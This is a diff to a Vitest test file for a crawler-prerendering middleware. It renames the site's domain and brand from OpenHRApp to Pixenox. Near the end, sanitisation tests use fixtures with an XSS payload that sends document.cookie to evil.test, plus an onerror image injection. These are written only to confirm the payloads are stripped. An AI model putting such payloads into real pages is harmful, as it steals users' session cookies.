@@ -64,7 +64,7 @@ afterEach(() => {
 
 describe('crawler detection', () => {
   it('passes real browsers straight through to the SPA', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', CHROME));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', CHROME));
     expect(res).toBeUndefined();
     expect(fetchMock).not.toHaveBeenCalled();
   });
@@ -74,7 +74,7 @@ describe('crawler detection', () => {
     ['AdSense crawler', ADSENSE],
     ['ClaudeBot', CLAUDEBOT],
   ])('serves full article content to %s', async (_name, ua) => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', ua));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', ua));
     expect(res).toBeDefined();
     expect(res!.headers.get('X-Prerender')).toBe('index-bot');
 
@@ -86,7 +86,7 @@ describe('crawler detection', () => {
   });
 
   it('serves metadata only to link-preview bots', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', FACEBOOK));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', FACEBOOK));
     expect(res!.headers.get('X-Prerender')).toBe('social-bot');
 
     const html = await res!.text();
@@ -97,7 +97,7 @@ describe('crawler detection', () => {
 
 describe('article document', () => {
   it('includes author, publish date, and reading time', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('By Monirul Islam');
     expect(html).toContain('<time datetime="2026-08-01T09:00:00Z">2026-08-01</time>');
@@ -105,7 +105,7 @@ describe('article document', () => {
   });
 
   it('emits BlogPosting and BreadcrumbList JSON-LD', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     const html = await res!.text();
 
     const blocks = [...html.matchAll(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/g)]
@@ -115,7 +115,7 @@ describe('article document', () => {
     expect(blocks[0]['@type']).toBe('BlogPosting');
     expect(blocks[0].headline).toBe('How to Stop Buddy Punching');
     expect(blocks[0].author).toEqual({ '@type': 'Person', name: 'Monirul Islam' });
-    expect(blocks[0].publisher.name).toBe('OpenHRApp');
+    expect(blocks[0].publisher.name).toBe('Pixenox');
     expect(blocks[0].datePublished).toBe('2026-08-01T09:00:00Z');
 
     expect(blocks[1]['@type']).toBe('BreadcrumbList');
@@ -123,8 +123,8 @@ describe('article document', () => {
   });
 
   it.each([
-    ['OpenHRApp', 'Organization'],
-    ['OpenHR Team', 'Organization'],
+    ['Pixenox', 'Organization'],
+    ['Pixenox Team', 'Organization'],
     ['Monirul Islam', 'Person'],
     ['Jane Doe', 'Person'],
   ])('types the byline "%s" as a schema.org %s', async (author, expectedType) => {
@@ -132,7 +132,7 @@ describe('article document', () => {
     // Results Test flags it, so the @type is derived from the name.
     vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify([{ ...POST_ROW, author_name: author }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
     const ld = JSON.parse(html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/)![1]);
 
@@ -143,7 +143,7 @@ describe('article document', () => {
   it('omits the author entirely when a row has no byline', async () => {
     vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify([{ ...POST_ROW, author_name: null }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
     const ld = JSON.parse(html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/)![1]);
 
@@ -159,10 +159,10 @@ describe('article document', () => {
       cover_image: 'blog-covers/1234.webp',
     }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
     expect(html).not.toContain('.webp');
-    expect(html).toContain('content="https://openhrapp.com/img/screenshot-wide.png"');
+    expect(html).toContain('content="https://pixenox.com/img/screenshot-wide.png"');
     expect(html).toContain('<meta property="og:image:type" content="image/png">');
   });
 
@@ -172,14 +172,14 @@ describe('article document', () => {
       cover_image: 'blog-covers/1234.jpg',
     }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('/storage/v1/object/public/content-images/blog-covers/1234.jpg');
     expect(html).toContain('<meta property="og:image:type" content="image/jpeg">');
   });
 
   it('emits the image metadata Facebook needs to render a large card', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', FACEBOOK));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', FACEBOOK));
     const html = await res!.text();
 
     expect(html).toContain('<meta property="og:image" content=');
@@ -193,7 +193,7 @@ describe('article document', () => {
 
   it('never emits a WebP social image on any route', async () => {
     for (const p of ['/', '/blog', '/features', '/features/attendance-tracking', '/how-to-use']) {
-      const res = await middleware(req(`https://openhrapp.com${p}`, GOOGLEBOT));
+      const res = await middleware(req(`https://pixenox.com${p}`, GOOGLEBOT));
       if (!res) continue;
       const html = await res.text();
       const images = [...html.matchAll(/(?:og:image|twitter:image)" content="([^"]+)"/g)].map((m) => m[1]);
@@ -202,77 +202,77 @@ describe('article document', () => {
   });
 
   it('uses TechArticle for guides', async () => {
-    const res = await middleware(req('https://openhrapp.com/how-to-use/setting-up-organization', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/how-to-use/setting-up-organization', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('"@type":"TechArticle"');
   });
 
   it('sets a canonical URL and a self-referencing og:url', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     const html = await res!.text();
-    expect(html).toContain('<link rel="canonical" href="https://openhrapp.com/blog/how-to-stop-buddy-punching">');
-    expect(html).toContain('<meta property="og:url" content="https://openhrapp.com/blog/how-to-stop-buddy-punching">');
+    expect(html).toContain('<link rel="canonical" href="https://pixenox.com/blog/how-to-stop-buddy-punching">');
+    expect(html).toContain('<meta property="og:url" content="https://pixenox.com/blog/how-to-stop-buddy-punching">');
   });
 
   it('varies on user-agent so the SPA response is not cached for crawlers', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     expect(res!.headers.get('Vary')).toBe('User-Agent');
   });
 });
 
 describe('index pages', () => {
   it('lists published posts on /blog with links crawlers can follow', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('href="/blog/how-to-stop-buddy-punching"');
     expect(html).toContain('"@type":"CollectionPage"');
   });
 
   it('lists guides on /how-to-use', async () => {
-    const res = await middleware(req('https://openhrapp.com/how-to-use', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/how-to-use', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('href="/how-to-use/setting-up-organization"');
   });
 
   it('renders the feature index without hitting the database', async () => {
-    const res = await middleware(req('https://openhrapp.com/features', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/features', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('href="/features/attendance-tracking"');
     expect(fetchMock).not.toHaveBeenCalled();
   });
 
   it('renders the homepage with links into the content hub', async () => {
-    const res = await middleware(req('https://openhrapp.com/', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('href="/how-to-use"');
     expect(html).toContain('href="/blog"');
   });
 
   it('does not prerender index pages for link-preview bots', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog', FACEBOOK));
+    const res = await middleware(req('https://pixenox.com/blog', FACEBOOK));
     expect(res).toBeUndefined();
   });
 });
 
 describe('fall-through behaviour', () => {
   it('falls through to the SPA for an unknown slug', async () => {
-    const res = await middleware(req('https://openhrapp.com/blog/missing', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/missing', GOOGLEBOT));
     expect(res).toBeUndefined();
   });
 
   it('falls through when Supabase errors', async () => {
     vi.stubGlobal('fetch', vi.fn(async () => new Response('boom', { status: 500 })));
-    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     expect(res).toBeUndefined();
   });
 
   it('falls through for an unknown feature slug', async () => {
-    const res = await middleware(req('https://openhrapp.com/features/not-a-feature', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/features/not-a-feature', GOOGLEBOT));
     expect(res).toBeUndefined();
   });
 
   it('only requests PUBLISHED rows', async () => {
-    await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
+    await middleware(req('https://pixenox.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
     const requested = String(fetchMock.mock.calls[0][0]);
     expect(decodeURIComponent(requested)).toContain('status=eq.PUBLISHED');
   });
@@ -285,7 +285,7 @@ describe('untrusted content handling', () => {
       content: '<p>ok</p><script>fetch("https://evil.test?c="+document.cookie)</script>',
     }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
     expect(html).toContain('<p>ok</p>');
     expect(html).not.toContain('evil.test');
@@ -298,7 +298,7 @@ describe('untrusted content handling', () => {
       title: '<img src=x onerror=alert(1)>',
     }]), { status: 200 })));
 
-    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
+    const res = await middleware(req('https://pixenox.com/blog/x', GOOGLEBOT));
     const html = await res!.text();
 
     // The payload may appear as inert text; what must never appear is a live tag.
